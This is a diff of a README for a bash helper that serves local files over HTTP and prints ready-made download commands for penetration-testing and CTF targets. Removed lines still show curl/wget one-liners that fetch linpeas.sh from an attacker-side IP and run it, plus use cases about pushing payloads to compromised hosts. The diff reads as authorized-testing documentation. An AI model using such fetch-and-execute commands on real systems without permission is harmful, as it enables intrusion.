@@ -4,8 +4,8 @@ A simple bash script to serve files from your current directory over HTTP and ge
 
 ## Features
 
-- 🚀 **Quick HTTP Server**: Serves files using `goshs` on port 80
-- 🔍 **Auto-Detection**: Automatically detects your `tun0` IP address (VPN/HTB)
+- 🚀 **Quick HTTP Server**: Serves files using `goshs` (preferred) or `python3` (fallback)
+- 🔍 **Auto-Detection**: Detects `tun0` by default or prompts for an active network interface
 - 📋 **Download Commands**: Generates ready-to-use download commands for:
   - Linux (curl, wget)
   - Windows CMD (certutil, curl, bitsadmin)
@@ -14,20 +14,19 @@ A simple bash script to serve files from your current directory over HTTP and ge
   - Select specific files from a numbered list
   - Choose target OS (Linux/Windows) to filter commands
 - 🔒 **URL Encoding**: Properly handles filenames with spaces, `#`, and `%` characters
-- 📁 **File Listing**: Lists all files in the current directory with their download commands
+- 🛡️ **Smart Port Binding**: Automatically falls back to port 8000 if port 80 is requested without root privileges
 
 ## Prerequisites
 
-- **goshs**: A simple HTTP server written in Go
+- **goshs** (Optional): A simple HTTP server written in Go
   ```bash
   go install github.com/patrickhener/goshs@latest
   ```
-  
-- **VPN Connection**: Must be connected to a VPN with a `tun0` interface (e.g., HackTheBox, TryHackMe)
+- **python3** (Fallback): Used if `goshs` is not found
 
 ## Installation
 
-1. Clone or download the script:
+1. Clone or download the repository:
    ```bash
    git clone <repository-url>
    cd httpserver-and-downloader
@@ -36,6 +35,11 @@ A simple bash script to serve files from your current directory over HTTP and ge
 2. Make the script executable:
    ```bash
    chmod +x serve_local.sh
+   ```
+
+3. Add it to your system PATH as `srvl` (optional but recommended):
+   ```bash
+   sudo ln -s /home/noah/Documents/httpserver-and-downloader/serve_local.sh /usr/local/bin/srvl
    ```
 
 ## Usage
@@ -49,68 +53,30 @@ A simple bash script to serve files from your current directory over HTTP and ge
    ```bash
    ./serve_local.sh
    ```
+   *Or with the system-wide command if you created the symlink:*
+   ```bash
+   srvl
+   ```
+   *Or with custom options:*
+   ```bash
+   ./serve_local.sh -i eth0 -p 8080
+   ```
 
 3. The script will:
-   - Detect your `tun0` IP address
+   - Detect your IP address (or prompt for interface)
    - List files with numbers (e.g., `[1] filename`)
    - Prompt you to select a file by number
    - Prompt you to select the target OS (Linux or Windows)
    - Print download commands for the selected file and OS
-   - Start the HTTP server on port 80
+   - Start the HTTP server
 
 4. Copy and paste the appropriate download command on the target machine
 
-## Example Output
-
-```
-tun0 IP detected: 10.10.14.42
-
-Files in /home/user/tools:
-  [1] linpeas.sh
-  [2] chisel
-
-Enter number to select file: 1
-Selected: linpeas.sh
-
-Target OS:
-  [1] Linux
-  [2] Windows
-Enter number to select OS: 1
-Selected OS: Linux
-
-========== Download commands (per file) ==========
-
-File: linpeas.sh
-  Linux:
-    curl -fsSL "http://10.10.14.42:80/linpeas.sh" -o "linpeas.sh" && chmod +x "linpeas.sh" && ./"linpeas.sh"
-    wget -q --show-progress -O "linpeas.sh" "http://10.10.14.42:80/linpeas.sh" && chmod +x "linpeas.sh" && ./"linpeas.sh"
-
-==============================================
-Starting goshs server on port 80 (foreground)
-Serving directory: /home/user/tools
-URL: http://10.10.14.42:80/
-(Press Ctrl+C to stop)
-==============================================
-```
-
-## Use Cases
-
-### Penetration Testing
-- Quickly transfer enumeration scripts (linpeas, winpeas, etc.)
-- Serve exploit payloads to target machines
-- Transfer tools during post-exploitation
-
-### CTF Challenges
-- Serve files to compromised machines
-- Quick file transfers during competitions
-- Easy access to your toolkit
-
-### Red Team Operations
-- Serve payloads during engagements
-- Transfer tools to compromised hosts
-- Quick and reliable file transfer method
-
 ## Technical Details
+
+### Command-Line Arguments
+- `-i` or `--interface`: Specify the network interface to use
+- `-p` or `--port`: Specify the port to listen on (default: 80)
 
 ### URL Encoding
 The script properly URL-encodes filenames with special characters:
@@ -118,37 +84,8 @@ The script properly URL-encodes filenames with special characters:
 - Hash (`#`) → `%23`
 - Percent (`%`) → `%25`
 
-The encoding order is critical to prevent double-encoding issues.
-
 ### Port Configuration
-Default port is **80** (requires root/sudo on Linux). You can modify the `PORT` variable in the script if needed:
-```bash
-PORT=8080  # Change to your preferred port
-```
-
-### Network Interface
-The script specifically looks for the `tun0` interface, which is standard for VPN connections. If you need to use a different interface, modify the `get_tun0_ip()` function.
-
-## Troubleshooting
-
-### Error: No IPv4 address found on tun0
-- **Cause**: Not connected to VPN or VPN interface is not named `tun0`
-- **Solution**: Connect to your VPN (HackTheBox, TryHackMe, etc.)
-
-### Error: 'goshs' not found in PATH
-- **Cause**: goshs is not installed or not in PATH
-- **Solution**: Install goshs:
-  ```bash
-  go install github.com/patrickhener/goshs@latest
-  ```
-
-### Permission denied on port 80
-- **Cause**: Port 80 requires root privileges
-- **Solution**: Run with sudo:
-  ```bash
-  sudo ./serve_local.sh
-  ```
-  Or change the port to something above 1024 (e.g., 8080)
+Default port is **80** (requires root/sudo on Linux). If run as a non-root user, it automatically falls back to **8000**.
 
 ## Security Considerations
 
@@ -157,25 +94,16 @@ The script specifically looks for the `tun0` interface, which is standard for VP
 - The server serves files without authentication
 - All files in the directory are accessible
 - Use only in controlled, authorized environments
-- Always ensure you have permission to transfer files
 
 ## License
 
 This project is provided as-is for educational and authorized penetration testing purposes only.
 
-## Contributing
-
-Feel free to submit issues or pull requests for improvements!
-
 ## Changelog
 
-### Version 1.0
-- Initial release
-- Support for goshs HTTP server
-- Auto-detection of tun0 IP
-- Multi-platform download commands
-- Proper URL encoding for special characters
-
-### Version 1.1
-- Added interactive numbered file selection
-- Added target OS selection (Linux/Windows) to filter commands
+### Version 1.2 (Current)
+- Added fallback to `python3 -m http.server`
+- Added flexible network interface selection (or interactive prompt)
+- Added command-line argument parsing (`-i`, `-p`)
+- Added smart port binding with root check
+- Added installation instructions for system-wide access as `srvl`
